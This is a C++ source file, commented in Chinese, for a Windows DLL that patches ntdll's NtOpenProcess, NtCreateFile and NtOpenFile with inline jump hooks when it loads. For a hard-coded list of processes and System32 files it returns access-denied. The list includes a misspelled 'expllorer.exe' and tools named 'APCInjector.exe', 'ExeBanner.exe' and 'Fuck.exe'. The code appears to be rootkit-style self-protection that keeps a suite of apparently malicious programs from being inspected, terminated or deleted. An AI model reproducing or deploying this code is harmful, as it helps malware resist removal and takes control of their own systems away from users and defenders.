// Protect64.cpp - 64位保护DLL (GCC 兼容)
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <cstdio>      // swprintf

// ================== 类型定义 ==================
typedef NTSTATUS(NTAPI *pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS(NTAPI *pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef NTSTATUS(NTAPI *pNtOpenFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess,
    ULONG OpenOptions
);

typedef NTSTATUS(NTAPI *pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// ================== 受保护列表 ==================
static const WCHAR* g_ProtectedProcesses[] = {
    L"expllorer.exe",
    L"ProgrammBanner.exe",
	L"SCMServiceGuard.exe",
	L"test.exe"
};
static const int g_ProtectedProcessCount = sizeof(g_ProtectedProcesses) / sizeof(g_ProtectedProcesses[0]);

static const WCHAR* g_ProtectedFiles[] = {
    L"C:\\windows\\system32\\APCInjector.exe",
	L"C:\\windows\\system32\\expllorer.exe",
	L"C:\\windows\\system32\\FileGuard.exe",
	L"C:\\windows\\system32\\ProgrammBanner.exe",
	L"C:\\windows\\system32\\Fuck.exe",
	L"C:\\windows\\system32\\MoudleUnloader.exe",
	L"C:\\windows\\system32\\SCMServiceGuard.exe",
	L"C:\\windows\\system32\\SystemShellGuard.dll",
	L"C:\\windows\\system32\\SetDesktopWallPaper.exe",
	L"C:\\windows\\system32\\ExeBanner.exe",
	L"C:\\windows\\system32\\APCTerminator.exe"
};
static const int g_ProtectedFileCount = sizeof(g_ProtectedFiles) / sizeof(g_ProtectedFiles[0]);

static WCHAR g_ProtectedNtPaths[10][MAX_PATH] = {0};
static UNICODE_STRING g_ProtectedNtUS[10];
static int g_ProtectedNtCount = 0;

// ================== 原始函数与钩子数据 ==================
static pNtOpenProcess OriginalNtOpenProcess = nullptr;
static pNtCreateFile OriginalNtCreateFile = nullptr;
static pNtOpenFile OriginalNtOpenFile = nullptr;
static pNtQuerySystemInformation OriginalNtQuerySystemInformation = nullptr;

static BYTE g_OrigBytesNtOpenProcess[12];
static BYTE g_OrigBytesNtCreateFile[12];
static BYTE g_OrigBytesNtOpenFile[12];

typedef BOOLEAN (NTAPI *pRtlEqualUnicodeString)(
    PCUNICODE_STRING String1,
    PCUNICODE_STRING String2,
    BOOLEAN CaseInSensitive
);
static pRtlEqualUnicodeString RtlEqualUnicodeString = nullptr;

// ================== 辅助函数 ==================
void WriteJump64(void* target, void* hook) {
    DWORD old;
    VirtualProtect(target, 12, PAGE_EXECUTE_READWRITE, &old);
    BYTE code[12];
    code[0] = 0x48;
    code[1] = 0xB8;
    *(UINT64*)(code + 2) = (UINT64)hook;
    code[10] = 0xFF;
    code[11] = 0xE0;
    memcpy(target, code, 12);
    VirtualProtect(target, 12, old, &old);
}

void RestoreBytes64(void* target, BYTE* orig) {
    DWORD old;
    VirtualProtect(target, 12, PAGE_EXECUTE_READWRITE, &old);
    memcpy(target, orig, 12);
    VirtualProtect(target, 12, old, &old);
}

BOOL IsProcessProtected(HANDLE pid) {
    ULONG bufferSize = 0;
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &bufferSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH) return FALSE;

    PVOID buffer = malloc(bufferSize);
    if (!buffer) return FALSE;
    status = OriginalNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        free(buffer);
        return FALSE;
    }

    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    BOOL found = FALSE;
    while (true) {
        if (spi->UniqueProcessId == pid) {
            UNICODE_STRING imageName = spi->ImageName;
            for (int i = 0; i < g_ProtectedProcessCount; i++) {
                UNICODE_STRING protectedName;
                RtlInitUnicodeString(&protectedName, g_ProtectedProcesses[i]);
                if (RtlEqualUnicodeString(&imageName, &protectedName, TRUE)) {
                    found = TRUE;
                    break;
                }
            }
            break;
        }
        if (spi->NextEntryOffset == 0) break;
        spi = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)spi + spi->NextEntryOffset);
    }
    free(buffer);
    return found;
}

BOOL IsFileProtected(PUNICODE_STRING fileName) {
    if (!fileName || !fileName->Buffer) return FALSE;
    for (int i = 0; i < g_ProtectedNtCount; i++) {
        if (RtlEqualUnicodeString(fileName, &g_ProtectedNtUS[i], TRUE)) {
            return TRUE;
        }
    }
    return FALSE;
}

// ================== 钩子函数 ==================
NTSTATUS NTAPI NtOpenProcess_Hook(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId)
{
    if (ClientId && ClientId->UniqueProcess) {
        if (IsProcessProtected(ClientId->UniqueProcess)) {
            return STATUS_ACCESS_DENIED;
        }
    }
    RestoreBytes64((void*)OriginalNtOpenProcess, g_OrigBytesNtOpenProcess);
    NTSTATUS status = OriginalNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    WriteJump64((void*)OriginalNtOpenProcess, (void*)NtOpenProcess_Hook);
    return status;
}

NTSTATUS NTAPI NtCreateFile_Hook(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength)
{
    if (ObjectAttributes && IsFileProtected(ObjectAttributes->ObjectName)) {
        return STATUS_ACCESS_DENIED;
    }
    RestoreBytes64((void*)OriginalNtCreateFile, g_OrigBytesNtCreateFile);
    NTSTATUS status = OriginalNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
        AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
    WriteJump64((void*)OriginalNtCreateFile, (void*)NtCreateFile_Hook);
    return status;
}

NTSTATUS NTAPI NtOpenFile_Hook(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess,
    ULONG OpenOptions)
{
    if (ObjectAttributes && IsFileProtected(ObjectAttributes->ObjectName)) {
        return STATUS_ACCESS_DENIED;
    }
    RestoreBytes64((void*)OriginalNtOpenFile, g_OrigBytesNtOpenFile);
    NTSTATUS status = OriginalNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes,
        IoStatusBlock, ShareAccess, OpenOptions);
    WriteJump64((void*)OriginalNtOpenFile, (void*)NtOpenFile_Hook);
    return status;
}

// ================== 初始化与卸载 ==================
void InstallHooks() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    OriginalNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
    OriginalNtCreateFile = (pNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
    OriginalNtOpenFile = (pNtOpenFile)GetProcAddress(ntdll, "NtOpenFile");
    OriginalNtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    RtlEqualUnicodeString = (pRtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");

    if (!OriginalNtOpenProcess || !OriginalNtCreateFile || !OriginalNtOpenFile ||
        !OriginalNtQuerySystemInformation || !RtlEqualUnicodeString)
        return;

    for (int i = 0; i < g_ProtectedFileCount && i < 10; i++) {
        swprintf(g_ProtectedNtPaths[i], MAX_PATH, L"\\??\\%s", g_ProtectedFiles[i]);
        RtlInitUnicodeString(&g_ProtectedNtUS[i], g_ProtectedNtPaths[i]);
        g_ProtectedNtCount++;
    }

    memcpy(g_OrigBytesNtOpenProcess, (const void*)OriginalNtOpenProcess, 12);
    WriteJump64((void*)OriginalNtOpenProcess, (void*)NtOpenProcess_Hook);

    memcpy(g_OrigBytesNtCreateFile, (const void*)OriginalNtCreateFile, 12);
    WriteJump64((void*)OriginalNtCreateFile, (void*)NtCreateFile_Hook);

    memcpy(g_OrigBytesNtOpenFile, (const void*)OriginalNtOpenFile, 12);
    WriteJump64((void*)OriginalNtOpenFile, (void*)NtOpenFile_Hook);
}

void RemoveHooks() {
    if (OriginalNtOpenProcess) RestoreBytes64((void*)OriginalNtOpenProcess, g_OrigBytesNtOpenProcess);
    if (OriginalNtCreateFile) RestoreBytes64((void*)OriginalNtCreateFile, g_OrigBytesNtCreateFile);
    if (OriginalNtOpenFile) RestoreBytes64((void*)OriginalNtOpenFile, g_OrigBytesNtOpenFile);
}

// ================== DllMain ==================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        InstallHooks();
        break;
    case DLL_PROCESS_DETACH:
        RemoveHooks();
        break;
    }
    return TRUE;
}